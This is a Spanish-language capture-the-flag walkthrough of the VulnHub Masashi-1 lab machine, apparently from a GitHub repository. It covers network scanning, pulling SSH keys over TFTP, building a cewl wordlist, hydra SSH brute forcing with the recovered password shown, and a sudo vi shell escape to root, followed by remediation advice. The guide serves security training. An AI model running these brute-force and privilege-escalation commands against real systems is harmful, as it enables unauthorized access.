# Ejecuci√≥n de la Gu√≠a

## 1. Introducci√≥n üåü
   - Bienvenido a la Gu√≠a de Auditor√≠a de Seguridad para la m√°quina Masashi. Esta gu√≠a est√° dise√±ada para proporcionar una visi√≥n detallada del proceso de auditor√≠a de seguridad en la m√°quina Masashi de VulnHub.

## 2. Preparaci√≥n del Laboratorio üîß
   - En esta secci√≥n, preparamos el entorno para la gu√≠a utilizando la m√°quina Masashi-1 de VulnHub, descargada desde [Masashi 1](https://www.vulnhub.com/entry/masashi-1,599/). Utilizamos una conexi√≥n NatNet y trabajamos con una m√°quina de dificultad f√°cil.

   Durante la gu√≠a, exploraremos y aprenderemos:

   - **Abuso de los privilegios de Sudoers (Escalada de privilegios)**
   - **Creaci√≥n de un diccionario personalizado con cewl**
   - **Fuerza bruta SSH - Hydra**

   Estos temas nos permitir√°n practicar t√©cnicas de seguridad inform√°tica y pruebas de penetraci√≥n.

## 3. Reconocimiento y Explotaci√≥n üí•

Durante esta fase, se llevaron a cabo diversas actividades de reconocimiento y explotaci√≥n para identificar posibles vulnerabilidades y obtener acceso al sistema objetivo.

   ### 1. **Escaneo de Red**
   - Se utiliz√≥ el comando `arp-scan` para explorar la red y descubrir dispositivos activos. Una de las direcciones IP identificadas fue 10.40.2.7, asociada a PCS Systemtechnik GmbH y es la IP de la m√°quina v√≠ctima.
```bash
   arp-scan --interface=eth3 --localnet
```
     
   ![arp-scan](https://github.com/Serch1102/PistasYGuias-VMPenTest/assets/116004680/51edcbd9-02f3-4e6c-ab84-595caa869e4d)

   ### 2. **Identificaci√≥n de Servicios y Versiones**
   - Se realiz√≥ un escaneo exhaustivo de puertos utilizando `nmap`, revelando que el puerto 22 (SSH) y el puerto 80 (HTTP) estaban abiertos en la m√°quina objetivo. Se identificaron los servicios OpenSSH 7.9p1 y Apache httpd 2.4.38 en ejecuci√≥n.
```bash
   nmap -A 10.40.2.7
```
   ![nmap](https://github.com/Serch1102/PistasYGuias-VMPenTest/assets/116004680/326ea9dd-774c-4043-ae4e-7cb6547e84a1)

   ### 3. **Exploraci√≥n de Recursos Web**
   - Se utiliz√≥ `gobuster` para buscar directorios y archivos ocultos en el servidor web en la URL http://10.40.2.7. Se encontraron rutas como `/server-status` que indicaban la presencia de ciertas funcionalidades del servidor web.

   ### 4. **Exploraci√≥n Adicional**
   - Se examinaron los archivos `robots.txt` y se descubrieron recursos como `snmpwalk.txt` y `sshfolder.txt`, revelando informaci√≥n sobre la configuraci√≥n del servidor.
```bash
   http://<<IP>>/robots.txt
```
   ![gobuster](https://github.com/Serch1102/PistasYGuias-VMPenTest/assets/116004680/2ab6d1f5-7110-4938-a709-1bd3b10ded8e)
   ![robots.txt](https://github.com/Serch1102/PistasYGuias-VMPenTest/assets/116004680/0031e2a3-e638-47ea-9a76-4caf88e27e0d)
   ![sshfolder.txt](https://github.com/Serch1102/PistasYGuias-VMPenTest/assets/116004680/ff0584bb-3dcd-493f-8203-101645f35ee6)
   ![snmpwalk.txt](https://github.com/Serch1102/PistasYGuias-VMPenTest/assets/116004680/03084f9c-88fc-49ee-a813-04b44df1aa51)

   ### 5. **Explotaci√≥n y Obtenci√≥n de Credenciales**
   - Se accedi√≥ a los archivos `id_rsa` y `id_rsa.pub` a trav√©s del servidor TFTP, pero se encontraron limitaciones en su uso.
```bash
   tftp 10.40.2.7 1337
   tftp> get id_rsa 
   tftp> get id_rsa.pub 
   tftp> quit
```
   ![tftp](https://github.com/Serch1102/PistasYGuias-VMPenTest/assets/116004680/0387fa56-e677-4f2d-8b1d-9f93b10944e3)
```bash
   cat id_rsa
   cat id_rsa.pub
```
   ![tftp](https://github.com/Serch1102/PistasYGuias-VMPenTest/assets/116004680/6a92d5b0-9738-40db-a4b1-a019241e9c64)

   - Se utiliz√≥ la herramienta `cewl` para crear un diccionario de contrase√±as basado en el contenido de la p√°gina web.
```bash
   cewl -d 10 -m 3 http://<<IP>>/index.html -w pass.txt
   wc -l pass.txt
```
   ![cewl](https://github.com/Serch1102/PistasYGuias-VMPenTest/assets/116004680/fb82ac25-1144-4b57-ac3d-5af42be2e0ea)

   - Posteriormente, se ejecut√≥ un ataque de fuerza bruta con `hydra` para obtener acceso SSH utilizando las credenciales proporcionadas.
     ```bash
     hydra -l sv5 -P pass.txt ssh://10.40.2.7 -t 4
     ```
     <img width="631" alt="Captura de pantalla 2024-02-10 192159" src="https://github.com/Serch1102/PistasYGuias-VMPenTest/assets/116004680/74eba9f0-ef96-4178-9d1e-839a3f3a6746">
   ```bash
   ssh sv5@<<IP>>
   psw:whoistheplug
   ```
   ![hydra](https://github.com/Serch1102/PistasYGuias-VMPenTest/assets/116004680/1d968506-7b3e-4279-a7fb-fd16098f13b6)

   ### 6. **Escalada de Privilegios**
   - Se obtuvo acceso al sistema como el usuario `sv5` por SSH.
```bash
    ls
```
```bash
   cat user.txt
```
   ![sv5 SSH](https://github.com/Serch1102/PistasYGuias-VMPenTest/assets/116004680/a174277b-c2d8-4edd-93dc-a6720ad3e49a)

   - Se realiz√≥ un an√°lisis de los privilegios disponibles. Se identific√≥ una vulnerabilidad que permit√≠a ejecutar comandos espec√≠ficos con privilegios de root5.
```bash
   sudo -l
```
<img width="624" alt="Captura de pantalla 2024-02-10 205946" src="https://github.com/Serch1102/PistasYGuias-VMPenTest/assets/116004680/f17e9636-4d2f-4b62-9914-86abff4bdf04">

```bash
   cd /tmp/
   touch pentest
   sudo /usr/bin/vi /tmp/pentest
```

<img width="636" alt="Captura de pantalla 2024-02-10 131320" src="https://github.com/Serch1102/PistasYGuias-VMPenTest/assets/116004680/68bb9364-e021-4411-9f03-630dcaa75b00">

```bash
#Dentro de terminal
   :!/bin/bash
```
<img width="360" alt="Captura de pantalla 2024-02-10 131403" src="https://github.com/Serch1102/PistasYGuias-VMPenTest/assets/116004680/6a85a50a-bacf-4638-8e6c-9bdf8f71fdcf">

```bash
cd /root/
ls
cat root.txt 
```


<img width="630" alt="Captura de pantalla 2024-02-10 131735" src="https://github.com/Serch1102/PistasYGuias-VMPenTest/assets/116004680/43ca6104-d6cd-416d-a753-a27e927b5bcc">


## 4. **Medidas Correctivas y Saneamiento** üõ°Ô∏è

Para sanear el servicio TFTP (Trivial File Transfer Protocol) y evitar mostrar informaci√≥n confidencial como usuarios o archivos, se pueden implementar las siguientes medidas correctivas:

  1. **Restricci√≥n de Acceso**: Configurar adecuadamente los permisos de acceso al servicio TFTP para limitar la visualizaci√≥n de archivos y directorios. Esto se puede lograr mediante la configuraci√≥n de los permisos de directorio y archivo en el sistema de archivos donde residen los archivos transferidos a trav√©s de TFTP.
   
  2. **Securizaci√≥n del TFTP Daemon**: Si el servicio TFTP est√° siendo ejecutado por un daemon o proceso, es fundamental asegurarse de que est√© configurado correctamente y siga las mejores pr√°cticas de seguridad. Esto implica revisar y ajustar la configuraci√≥n del daemon para restringir el acceso y minimizar el riesgo de exposici√≥n de informaci√≥n sensible.
   
  3. **Restricci√≥n de Directorios**: Limitar el acceso del servicio TFTP solo a los directorios necesarios para el intercambio de archivos. Se deben evitar los directorios que contengan informaci√≥n confidencial o archivos cr√≠ticos para la seguridad del sistema.
   
  4. **Implementaci√≥n de Listas Blancas y Listas Negras**: Configurar listas blancas y listas negras para controlar qu√© archivos y directorios pueden ser accesibles a trav√©s del servicio TFTP. Esto ayuda a garantizar que solo se puedan transferir archivos autorizados y que la informaci√≥n confidencial permanezca protegida.
   
   5. **Registro y Monitoreo**: Establecer registros detallados de actividad para supervisar el uso del servicio TFTP. Esto permite detectar y responder r√°pidamente a cualquier actividad sospechosa o intento de acceso no autorizado.
   
   6. **Actualizaciones y Parches**: Mantener el software del servicio TFTP actualizado con los √∫ltimos parches de seguridad y actualizaciones de software. Esto ayuda a mitigar vulnerabilidades conocidas y a garantizar un nivel √≥ptimo de seguridad.

Al implementar estas medidas correctivas y de saneamiento, se fortalece la seguridad del servicio TFTP y se reduce significativamente el riesgo de exposici√≥n de informaci√≥n confidencial o cr√≠tica para la organizaci√≥n. Es importante revisar y actualizar regularmente estas medidas para adaptarse a los cambios en el entorno de seguridad y las nuevas amenazas emergentes.

## 5. Lecciones Aprendidas üìö

Durante el proceso de auditor√≠a de seguridad en la m√°quina Masashi, se han identificado varias lecciones valiosas, especialmente en relaci√≥n con el uso de la herramienta Cewl y el protocolo TFTP (Trivial File Transfer Protocol):

1. **Herramienta Cewl**: La herramienta Cewl demostr√≥ ser una herramienta poderosa para la generaci√≥n de diccionarios de contrase√±as basados en el contenido de p√°ginas web. Aprendimos que la creaci√≥n de diccionarios personalizados puede ser √∫til para realizar ataques de fuerza bruta m√°s efectivos y dirigidos, aumentando as√≠ nuestras posibilidades de √©xito en la obtenci√≥n de credenciales v√°lidas.

2. **Protocolo TFTP**: El protocolo TFTP, aunque simple, puede presentar desaf√≠os en t√©rminos de seguridad si no se configura correctamente. Nos dimos cuenta de la importancia de asegurar adecuadamente los permisos de acceso y restringir la informaci√≥n que se transfiere a trav√©s de este protocolo. Adem√°s, aprendimos que la configuraci√≥n del servicio TFTP debe ser revisada y ajustada regularmente para garantizar su seguridad y mitigar posibles riesgos de exposici√≥n de informaci√≥n confidencial.

Estas lecciones nos han proporcionado una comprensi√≥n m√°s profunda de las t√©cnicas de seguridad inform√°tica y nos han permitido mejorar nuestra capacidad para identificar y abordar vulnerabilidades en sistemas y servicios en l√≠nea. A trav√©s de la pr√°ctica y la experiencia, continuaremos fortaleciendo nuestras habilidades en la auditor√≠a de seguridad y la protecci√≥n de activos digitales.

### Contribuciones y Mejoras
¬°Bienvenido a contribuir! Si encuentras mejoras o cambios necesarios, abre un problema o env√≠a una solicitud de extracci√≥n.
